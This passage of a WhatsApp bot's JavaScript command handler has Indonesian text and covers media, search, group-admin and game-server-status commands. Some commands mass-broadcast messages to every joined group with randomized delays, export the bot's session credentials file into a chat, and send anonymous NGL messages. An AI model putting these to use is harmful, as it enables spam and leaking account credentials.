        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                poxreply('Terjadi kesalahan saat menulis file:', err);
            } else {
                poxreply('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        poxreply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break
case 'jpm': {
    if (!isOwner) return reply(`Khusus Owner Aja`);
    if (!text) return reply(fs.readFileSync('./textjpm.js', 'utf8'));

    sendReaction("✔️");
    let getGroups = await mikupoxy.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let anu = groups.map((v) => v.id);
    
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    const batchSize = 2;
    const delays = [7000, 9000, 12000, 15000, 14000, 17000, 19000];
    for (let i = 0; i < anu.length; i += batchSize) {
        const batch = anu.slice(i, i + batchSize); // Ambil batch grup
        for (let xnxx of batch) {
            try {
                let metadat72 = await mikupoxy.groupMetadata(xnxx);
                let participanh = await metadat72.participants;

                const botNumber = await mikupoxy.decodeJid(mikupoxy.user.id);
                const isBotInGroup = participanh.some(participant => participant.id === botNumber);

                if (isBotInGroup) {
                    if (/image/.test(mime)) {
                        media = await mikupoxy.downloadAndSaveMediaMessage(quoted);
                        mem = await uptotelegra(media);
                        await mikupoxy.sendMessage(xnxx, { image: { url: mem }, caption: text });
                    } else {
                        await mikupoxy.sendMessage(xnxx, { text: text });
                    }
                }
            } catch (error) {
                console.error(`Failed to send message to group ${xnxx}:`, error);
            }
        }

        const randomDelay = delays[Math.floor(Math.random() * delays.length)];
        await delay(randomDelay);
    }    
}
break
case 'jadibot': {
if (!isOwner) return reply(mess.only.owner)

jadibot(mikupoxy, text, m)
}
break
case 'gimage': {
if (!text) return poxreply(`Example : ${prefix + command} carry minati`)
reply(mess.wait)
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
await mikupoxy.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
mikupoxy.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
mikupoxy.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
case "spotify": {
    const axios = require("axios");
    if (!text) return m.reply('Masukkan Judul Contoh\nContoh `La Vagualette!`');

    sendReaction("🕑");

    try {
    
        const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
        const searchData = (await axios.get(searchApiUrl)).data;
        
        const data = searchData[0];
        if (!data) return reply("Lagu tidak ditemukan.");

        const tekswait = `_###_ *SPOTIFY PLAYER* _###_

- *Judul:* ${data.title}
- *Artis:* ${data.artist}
- *URL:* ${data.url}`;

        await mikupoxy.sendMessage(m.chat, { 
            text: `${tekswait}`, 
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: { 
                    showAdAttribution: true,
                    title:`${data.title}`,
                    body:"SPOTIFY SEARCH & DOWNLOAD",
                    thumbnailUrl: data.thumbnail,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            } 
        }, { quoted: qchanel });

        const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
        
        let response = await fetch(downloadApiUrl);
        
        if (response.headers.get("content-type") === "audio/mpeg") {
            sendReaction("✅");
            await mikupoxy.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
        } else {
            m.reply("Gagal mendapatkan file audio.");
        }
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat mengambil file audio.");
    }
}
break     
case 'gtbsmarket': {
    sendReaction("🕑");
    const items = [
        {
            imagePath: './roles/image/growpass.jpg',
            title: 'GROWPASS',
            price: '3DL',
            description: '5 Diamond Locks / Rp 15.000',
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+growpass'
        },
        {
            imagePath: './roles/image/allinpass.jpg',
            title: 'ALL IN PASS',
            price: '3DL',
            description: '12 Diamond Locks / Rp 38.000',
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+All+In+Pass'
        },
        {
            imagePath: './roles/image/cheater.jpg',
            title: 'ROLE CHEATER',
            price: '3DL',
            description: '3 Diamond Locks / Rp 10.000',
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+role+cheater'
        },
        {
            imagePath: './roles/image/vip.jpg',
            title: 'ROLE VIP',
            price: '3DL',
            description: '3 Diamond Locks / Rp 10.000',
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+role+vip'
        },
        {
            imagePath: './roles/image/mod.jpg',
            title: 'ROLE MOD',
            price: '15DL',
            description: '15 Diamond Locks / Rp 50.000',
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+role+mod'
        },
        {
            imagePath: './roles/image/dev.jpg',
            title: 'ROLE DEVELOPER',
            price: '30DL',
            description: '30 Diamond Locks / Rp 100.000\n\n*UNLI ALL BLOCK AND ITEMS*',
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+role+developer'
        },
        {
            imagePath: './roles/image/dev.jpg',
            title: 'ROLE SUPER DEVELOPER',
            price: '30DL',
            description: '60 Diamond Locks / Rp 200.000\n\n*UNLI ALL ITEMS AND LOCK*',
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+role+super+developer'
        }
    ];

    // Meng-upload gambar secara bersamaan
    const uploadPromises = items.map(item =>
        prepareWAMessageMedia({ image: fs.readFileSync(item.imagePath) }, { upload: mikupoxy.waUploadToServer })
    );

    const uploadedMedia = await Promise.all(uploadPromises);

    // Membuat kartu untuk carousel
    const cards = uploadedMedia.map((media, index) => ({
        header: proto.Message.InteractiveMessage.Header.create({
            ...media,
            title: items[index].title,
            gifPlayback: false,
            subtitle: `Harga: ${items[index].price}`,
            hasMediaAttachment: false
        }),
        body: { text: `> Deskripsi: ${items[index].description}` },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "cta_url",
                    buttonParamsJson: `{"display_text":"${items[index].buttonText}","url":"https://wa.me/6282136066485?text=${items[index].buttonUrl}","merchant_url":"https://wa.me/6282136066485?text=${items[index].buttonUrl}"}`
                },
            ],
        },
    }));

    // Menghasilkan pesan
    let msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `> Halo kak ${pushname}, berikut marketplace yang kami sediakan!`
                        },
                        carouselMessage: {
                            cards: cards,
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        { quoted: m }
    );

    sendReaction("✅");
    await mikupoxy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,        
    });
}
break
case 'gtynmarket': {
    sendReaction("🕑");
    const items = [
        {
            imagePath: './roles/image/growpass.jpg',
            title: 'GROWPASS',
            price: '3DL',
            description: `*Price: 2 Diamond Lock's*

- Awesome rewards such as diamond locks, daily gems, growth time reduction & exclusive skin colors
- Grants you access to exclusive Grow Pass items in the gem-store
- Experience early access to new game features`,
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+growpass+yang+2+dl'
        },
        {
            imagePath: './roles/image/allinpass.jpg',
            title: 'ALL IN PASS',
            price: '3DL',
            description: `*Price: 2 Diamond Lock's*

- Receive a permanent 2x deposit bonus (5x event = you get 10x)
- Instantly receive 100,000 gems, 5 experience potions, 5 curse wands, 5 fire wands and 5 freeze wands`,
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+All+In+Pass+yang+2+dl'
        },
        {
            imagePath: './roles/image/cheater.jpg',
            title: 'ROLE CHEATER',
            price: '3DL',
            description: `*Price: 4 Diamond Lock's*

- Grants you access to ''/pay (GrowID) (amount)'' - pays a specific GrowID the amount of gems mentioned
- Access to ''/business'' - you can start your own business and upgrade it to earn gems every minute
- Exclusive access to ''/beta'' - it will join a beta server of **GTYN** to test out features & updates
- Grants you access to ''/vending (keyword)'' - search for items in vending machines, works through entire **GTYN**`,
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+role+cheater+yang+4+dl'
        },
        {
            imagePath: './roles/image/vip.jpg',
            title: 'ROLE VIP',
            price: '3DL',
            description: `*Price: 3 Diamond Lock*

- Receive daily rewards such as duct tapes, freeze wands, fire wands & curse wands
- Ability to execute ''/rainbow'' - gives you a rainbow colored name
- Ability to execute ''/info (growid)'' - shows you their inventory & storage
- Grants you access to ''/set'' - save, load or delete previously saved sets
- Find more commands & features by typing ''/vhelp'' in-game`,
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+role+vip+yang+3+dl'
        },
        {
            imagePath: './roles/image/mod.jpg',
            title: 'ROLE MOD',
            price: '25DL',
            description: `*Price: 25 Diamond Lock's*

- Receive daily mod items such as curse wands, fire wands and duct tapes
- Unlock tons of new exclusive commands **(/mhelp)**
- Experience early access to new game & mod features
- Ability to punish players
- Experience early access to new game & mod features`,
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+role+mod+yang+25+dl'
        },
        {
            imagePath: './roles/image/dev.jpg',
            title: 'ROLE DEVELOPER',
            price: '35DL',
            description: `*Price: 35 Diamond Lock's*

*Current features/commands:*

- Gives you an yellow name with @
- Instantly receive all moderator perks **(Join the moderator-only channels if you'd like to punish players)**
- Gives you the ability to break bedrock in your own world(s)
- Grants you many special command ''/mhelp'' & ''/dhelp''
- Grants you access to ''/ghost'' - you can go through blocks
- Grants you access to ''/1hit'' - makes you 1-hit all blocks automatically
- Grants you access long-punch and long-wrench in all worlds
- Grants you access to ''/warpto (GrowID)'' - it will warp to that player's current position **(be careful with this)**
- Moderators & Guardians cannot see you while being ''/invis''`,
            buttonText: 'Beli Sekarang',
            buttonUrl: 'bang+mau+beli+role+dev+yang+35+dl'
        },
    ];

    // Meng-upload gambar secara bersamaan
    const uploadPromises = items.map(item =>
        prepareWAMessageMedia({ image: fs.readFileSync(item.imagePath) }, { upload: mikupoxy.waUploadToServer })
    );

    const uploadedMedia = await Promise.all(uploadPromises);

    // Membuat kartu untuk carousel
    const cards = uploadedMedia.map((media, index) => ({
        header: proto.Message.InteractiveMessage.Header.create({
            ...media,
            title: items[index].title,
            gifPlayback: false,
            subtitle: `Harga: ${items[index].price}`,
            hasMediaAttachment: false
        }),
        body: { text: `> Deskripsi: ${items[index].description}` },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "cta_url",
                    buttonParamsJson: `{"display_text":"${items[index].buttonText}","url":"https://wa.me/6285280840704?text=${items[index].buttonUrl}","merchant_url":"https://wa.me/6285280840704?text=${items[index].buttonUrl}"}`
                },
            ],
        },
    }));

    // Menghasilkan pesan
    let msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `> Halo kak ${pushname}, berikut marketplace yang kami sediakan!`
                        },
                        carouselMessage: {
                            cards: cards,
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        { quoted: m }
    );

    sendReaction("✅");
    await mikupoxy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });
}
break
case 'gtynstatus': {
    sendReaction("🕑");
    const data = await fetchApiData();
    if (data) {
        const message = `              
• *🟢 GTYN STATUS*
• *🕒 Uptime Bot Status:* \`${runtime(process.uptime())}\`
            
*GTYN INFORMATION*
• *Crazy Jim's Task:* \`${data.crazy_jim}\`
• *Guild Event's Task:* \`${data.guild_event}\`
• *Gem's Event:* \`${data.gems} Multiplier\`
• *XP Event:* \`${data.xp} Multiplier\`
*[===============================]*
*SERVER INFORMATION*
• *Player's Online:* \`${data.online} Online\`
• *Top Player's:* \`${data.best_player}\`
• *Best World's:* \`${data.best_world}\`            
• *Last Broadcast:* \`${data.broadcast}\` 
*[===============================]*
*LOGS SERVER*
• *Banned Word:* \`${data.banned_keyword}\`
• *Player's:* \`${data.ban}\`
• *Player's:* \`${data.unban}\`

*Credit Code:* \`Kinchan\` `;
        reply(message);
        sendReaction("✅");
    } else {
        reply('Status Erorr.');
    }
    break;
}
case 'gtyn': {
    sendReaction("🕑");
    const data = await fetchApiData();
    if (data) {
        const message = `
  *_STATUS SERVER_*
                
> \*GTYN Players: ${data.online} Online Now\*
> \*[===============================]\*
> \*players ${data.ban}\* `;
        reply(message);
        sendReaction("✅");
    } else {
        reply('Failed Fetch Data, Try Again Please.');
    }
    break;
}
case 'gtbsstatus': {
    sendReaction("🕑");
    const data = await gtbs();
    if (data) {
        const message = `              
• *🟢 GTBS STATUS*
• *🕒 Uptime Bot Status:* \`${runtime(process.uptime())}\`
            
~_*GTBS INFORMATION*_~

> • *Crazy Jim's Task:* \`${data.crazy_jim}\`
> • *Guild Event's Task:* \`${data.guild_event}\`
> • *Gem's Event:* \`${data.gems} Multiplier\`
> • *XP Event:* \`${data.xp} Multiplier\`

*[===============================]*

~_*SERVER INFORMATION*_~ 

> • *Player's Online:* \`${data.online} Online\`
> • *Top Player's:* \`${data.best_player}\`
> • *Best World's:* \`${data.best_world}\`            
> • *Last Broadcast:* \`${data.broadcast}\` 

*[===============================]*

~_*LOGS SERVER*_~

> • *Banned Word:* \`${data.banned_keyword}\`
> • *Player's:* \`${data.ban}\`
> • *Player's:* \`${data.unban}\`

> *Credit Code:* \`Kinchan\` `;
        reply(message);
        sendReaction("✅");
    } else {
        reply('Status Erorr.');
    }
    break;
}
case 'gtbs': {
    sendReaction("🕑");
    const data = await gtbs();
    if (data) {
        const message = `
  *_STATUS SERVER_*
                   
> \*GTBS Players: ${data.online} Online Now\*
> \*[===============================]\*
> \*players ${data.ban}\* `;
        reply(message);
        sendReaction("✅");
    } else {
        reply('Error, Try Again Please.');
    }
    break;
 }
case 'public': {
if (!isOwner) return reply(mess.only.owner)
mikupoxy.public = true
poxreply('*Berhasil Mengubah Ke Penggunaan Publik*')
            }
break
case 'self': {
if (!isOwner) return reply(mess.only.owner)
mikupoxy.public = false
poxreply('*Sukses Berubah Menjadi Pemakaian Sendiri*')
            }
break
case 'checkhost': {
if (!text) return m.reply(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
sendReaction("🕑");
try {
let host = await axios.post(
  'https://check-host.cc/rest/V2/http',
  {
    'target': text,
    'apikey': 'NOKEY',
    'ClientIP': null
  },
  {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
    }
  }
);
let idport = host.data.reportid
await sleep(5000)
let hostreport = await fetchJson(`https://check-host.cc/rest/V2/report/${idport}`)
let teks = `*乂 CEK HOST WEB*\n\nID: ${idport}\n\n`;
for (let x of hostreport.slaves) {
teks += `- Server: ${x.server}
- Status: ${x.code}
- Ping: ${x.time ? x.time : "down"}\n────────────────────\n\n`
}
let tekss = teks.replace(/<span style="color: #ea5455;">/g, '').replace(/span>/g, '').replace(/[</]/g, '')
balas(tekss)
} catch (e) {
m.reply('Domain Invalid...')
}
}
break
case 'blur': {
     sendReaction("🕑");
    if (/image/.test(mime)) {
        let media = await (m.quoted ? m.quoted.download() : m.download());
        if (!media) throw `Couldn't fetch the required Image`;

        let level = text || '8'; // Default blur level
        const img = await jimp.read(media);
        img.blur(isNaN(level) ? 8 : parseInt(level)); // Apply blur effect
        img.getBuffer('image/jpeg', (err, buffer) => {
            if (err) throw err?.message || `Couldn't blur the image`;
            mikupoxy.sendMessage(m.chat, { image: buffer, caption: 'Image successfully blur' }, { quoted: m });
        });
        sendReaction("✅");
    } else {
        m.reply(`Kirim/Reply Gambar dengan format\nExample: ${prefix + command}`);
    }
}
break
case 'sendngl': {
if (!text) return m.reply(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} https://ngl.link/denakhtar1 hallo`)
if (!budy.match('https://ngl.link/')) return m.reply(`Contoh:\n${prefix + command} https://ngl.link/denakhtar1 hallo`)
sendReaction("🕑");
let [usersi, ...message] = text.split(' ');
let userr = usersi.split('https://ngl.link/')[1]
message = message.join(' ');
let ngl = await axios.post("https://ngl.link/api/submit",
    `username=${userr}&question=${message}&deviceId=18d7b980-ac6a-4878-906e-087dfec6ea1b&gameSlug=&referrer=`
  );
reply(`*Pesan Berhasil Terkirim*

ID: ${ngl.data.questionId}
Region: ${ngl.data.userRegion}
`)
}
sendReaction("✅");
break
case 'cekbandwidth':
sendReaction("🕑");
addCountCmd('cekbandwidth', m.sender, _cmd)
var { download, upload } = await checkBandwidth();
m.reply(`*Bandwidth Server*\n\n*>* Upload : ${upload}\n*>* Download : ${download}`)
sendReaction("✅");
break
case 'pin':
              case 'pinterest': {
    let input = "> _contoh: pin Marsha lenathea_";
    if (!text) return reply(input);
      sendReaction("🕑");
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: mikupoxy.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest(text);
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `${text}\n> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});
    sendReaction("✅");
    await mikupoxy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'mc':
case 'server': {
    if (args.length == 0) return m.reply(`*Java / Bedrock*\n\nPake IP Contoh\nJava\n.mc java hyperxz.id\nBedrock\n.mc bedrock bedrock.hyperxz.id:19132`);

    try {
        if (args[0] === 'bedrock') {
            sendReaction("🕑");
            axios.get(`https://api.mcstatus.io/v2/status/bedrock/${args[1]}`).then(({ data }) => {
                var caption = `*〆 ᴍɪɴᴇᴄʀᴀғᴛ ʙᴇᴅʀᴏᴄᴋ sᴇʀᴠᴇʀ*\n`;
                caption += ` *〆 ɪᴘ : ${data.host}*\n`;
                caption += ` *〆 ᴘᴏʀᴛ : ${data.port}*\n`;
                caption += `\n`;
                caption += ` *〆 sᴇʀᴠᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ*\n`;
                caption += ` *〆 ᴘʟᴀʏᴇʀ ᴏɴʟɪɴᴇ : ${data.players.online}/${data.players.max}*\n`;
                caption += ` *〆 ɢᴀᴍᴇᴍᴏᴅᴇ : ${data.gamemode}*\n`;
                caption += ` *〆 ᴇᴅɪᴛɪᴏɴ : ${data.edition}*\n`;

                let buttonnya = [{
                    buttonId: `check_server_bedrock_${args[1]}`,
                    buttonText: { displayText: 'Link Cek Server' },
                    type: 1
                }];

                let buttons = {
                    text: caption,
                    footer: `Server Minecraft By; ${ownername}`,
                    buttons: buttonnya,
                    headerType: 1
                };

                mikupoxy.sendMessage(m.chat, buttons);
                sendReaction("✅");
            });
        } else if (args[0] === 'java') {
            sendReaction("🕑");
            axios.get(`https://api.mcstatus.io/v2/status/java/${args[1]}`).then(({ data }) => {
                var caption = `*〆 ᴍɪɴᴇᴄʀᴀғᴛ ᴊᴀᴠᴀ sᴇʀᴠᴇʀ*\n`;
                caption += `*〆 ɪᴘ : ${data.host}*\n`;
                caption += `*〆 ᴘᴏʀᴛ : ${data.port}*\n`;
                caption += `\n`;
                caption += `*〆 sᴇʀᴠᴇʀ ɪɴғᴏʀᴍᴀᴛɪᴏɴ*\n`;
                caption += `*〆 ᴘʟᴀʏᴇʀ ᴏɴʟɪɴᴇ : ${data.players.online}/${data.players.max}*\n`;
                caption += `*〆 ᴠᴇʀsɪᴏɴ : ${data.version.name_clean}*\n`;

                let buttonnya = [{
                    buttonId: `check_server_java_${args[1]}`,
                    buttonText: { displayText: 'Link Cek Server' },
                    type: 1
                }];

                let buttons = {
                    text: caption,
                    footer: `Server Minecraft By; ${ownername}`,
                    buttons: buttonnya,
                    headerType: 1
                };

                mikupoxy.sendMessage(m.chat, buttons);
                sendReaction("✅");
            });
        }
    } catch (err) {
        let error = `Server Gak Di Temukan Atau Ga Lagi Eror\n`;
        error += `\n\n`;
        error += `${err}`;
        reply(`${error}`);
        sendReaction("❌");
    }
}
break
case 'hdvid' : {
if (!isPrem) return replyprem(mess.premium)
if (!quoted) return m.reply(`Reply Video Yang Ingin Dijadikan HD Dengan Caption ${prefix + command}`)
sendReaction("🕑");
let output = getRandom('.mp4')
const media = await mikupoxy.downloadAndSaveMediaMessage(quoted)
ffmpeg(media)
    .outputOptions('-s', '1920x1080')
    .save(output)
    .on('end', () => {
 
sendReaction("✅");
mikupoxy.sendMessage(m.chat, { video: fs.readFileSync(output), caption: "Nih!",gifPlayback: false},{quoted: m})
    })
    .on('error', (err) => {
      console.error(err)
      m.reply('Terjadi kesalahan saat meningkatkan resolusi video. ' + err)
    })
}
break
case 'googlevoice': {
    sendReaction("🕑");
    let textvn = text || '';
    if (!textvn) {
        return reply(`_Masukkan Teksnya !_ \n\n_Contoh:  *Voiceai Halo google*_`);
    }
    textvn = textvn.substring(0, 199);
    try {
        vn = await getBuffer(`https://translate.google.com/translate_tts?ie=UTF-8&q=${textvn}&tl=id&total=1&idx=0&textlen=4&client=tw-ob&prev=input&ttsspeed=1`);
        repf = await mikupoxy.sendMessage(
            m.chat,
            { audio: vn, mimetype: 'audio/mp4', ptt: true },
            { quoted: m }
        );
        sendReaction("✅");
    } catch (error) {
        sendReaction("⛔");
    }
}
break
case 'getpp': {
if (!m.mentionedJid[0] && !m.quoted && !text) return reply(`Tag/Reply Target Yang Mau Di ${command}`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
sendReaction("🕑");
try {
avatar = await mikupoxy.profilePictureUrl(users, "image")
} catch {
avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
sendReaction("✅");
mikupoxy.sendMessage(m.chat, { image: { url: avatar }, caption: `*Action :* [ V1 ] Get PP 🔎\n*Result :* Succes ✅\n` }, { quoted: m })
}
break
case 'getdesc': {
if (!m.isGroup) return reply('Perintah ini hanya dapat digunakan di dalam grup.');
    if (!isAdmins && !isOwner) return reply('Perintah ini hanya untuk admin grup.');
    if (!isBotAdmins) return reply('Bot harus menjadi admin terlebih dahulu.');
sendReaction("🕑");
let iya = `> Description Group:
 
*${groupName}*\n\n${groupMetadata.desc}`
reply(iya)
sendReaction("✅");
}
break
case 'play': {
if (!text || text.trim() === "") return reply(`Contoh: ${prefix + command} suzume`);
sendReaction("🕑");
try {
const axios = require("axios");
async function getBuffer(url) {
const res = await axios({
method: 'get',
url,
responseType: 'arraybuffer'
});
return res.data;
}
const res = await axios.get(`https://Ikygantengbangetanjay-api.hf.space/yt?query=${encodeURIComponent(text)}`);
const video = res.data.result;
if (!video) return reply('Video/Audio Tidak Ditemukan');
if (video.duration.seconds >= 3600) {
return reply('Video is longer than 1 hour!');
}
const audioUrl = video.download.audio;
const videoUrl = video.download.video;
if (!audioUrl || !videoUrl) {
return reply("Gagal mendapatkan audio/video URL. Silakan coba lagi.");
}
const thumbBuffer = await getBuffer(video.thumbnail);
await mikupoxy.sendMessage(m.chat, {
video: {
url: videoUrl
},
mimetype: 'video/mp4',
fileName: `${video.title}.mp4`,
jpegThumbnail: thumbBuffer,
caption: `🎥 *${video.title}*\n📽 *Source*: ${video.url}`
}, {
quoted: m
});
await mikupoxy.sendMessage(m.chat, {
audio: {
url: audioUrl
},
mimetype: 'audio/mpeg',
fileName: `${video.title}.mp3`,
jpegThumbnail: thumbBuffer
}, {
quoted: m
});
sendReaction("✅");
} catch (e) {
reply(`*Error:* ${e.message}`);
}
};
break
case 'promote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await mikupoxy.groupParticipantsUpdate(m.chat, [users], 'promote')
await poxreply(`Done`)
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await mikupoxy.groupParticipantsUpdate(m.chat, [users], 'demote')
await poxreply(`Done`)
}
break
case 'kick': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
 sendReaction("🕑");
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await mikupoxy.groupParticipantsUpdate(m.chat, [users], 'remove')
await poxreply(`Done`)
sendReaction("✅");
}
break
case 'intro':{
if (!m.isGroup) return reply('Perintah ini hanya dapat digunakan di dalam grup.');
if (!isAdmins) return reply('Perintah ini hanya untuk admin grup.');
var intro =`⸙‹•══════════════♡᭄
│       *「 Kartu Intro 」*
│ *Nama     :* 
│ *Gender   :* 
│ *Umur      :* 
│ *Hobby    :* 
│ *Kelas      :* 
│ *Asal         :* 
│ *Agama    :* 
|  *Status     :* 
╰═════ꪶ ۪⸙ ━ ━ ━ ━ ꪶ ̷⸙
`
mikupoxy.sendMessage(m.chat, {text: intro }, {quoted: qchanel})
}
case 'backup': {
if (!isOwner) return reply(mess.only.owner)
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await mikupoxy.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break
case 'getsession':
if (!isOwner) return reply(mess.only.owner)
poxreply('Wait a moment, currently retrieving your session file')
let sesi = await fs.readFileSync('./sessions/creds.json')
mikupoxy.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break
case 'delcase': {
if (!isOwner) return reply(mess.only.owner)
    if (!text) return poxreply('Mana case nya');
dellCase('./Case.js', q)
m.reply('Berhasil menghapus case!.');
}
break
  
case 'clearsession': {
fs.readdir("./sessions", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return poxreply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
 )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan <3\n\n`
if(filteredArray.length == 0) return poxreply(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
}) 
poxreply(`${teks}`) 
await sleep(2000)
poxreply("Menghapus file Kenangan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sessions/${file}`)
});
await sleep(2000)
poxreply("Berhasil menghapus semua Kenangan di folder session") 
});
}
break
case 'delete': case 'del': {
 if (!m.isGroup) return reply('Perintah ini hanya dapat digunakan di dalam grup.');
 if (!isAdmins && !isOwner) return reply('Perintah ini hanya untuk admin grup.');
 if (!isBotAdmins) return reply('Bot harus menjadi admin terlebih dahulu.');
if (!m.quoted) throw false
let { chat, id } = m.quoted
 mikupoxy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
 }
break
case 'antilinkall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !isOwner) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return poxreply('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
poxreply('Success in turning on all antilink in this group')
var groupe = await mikupoxy.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
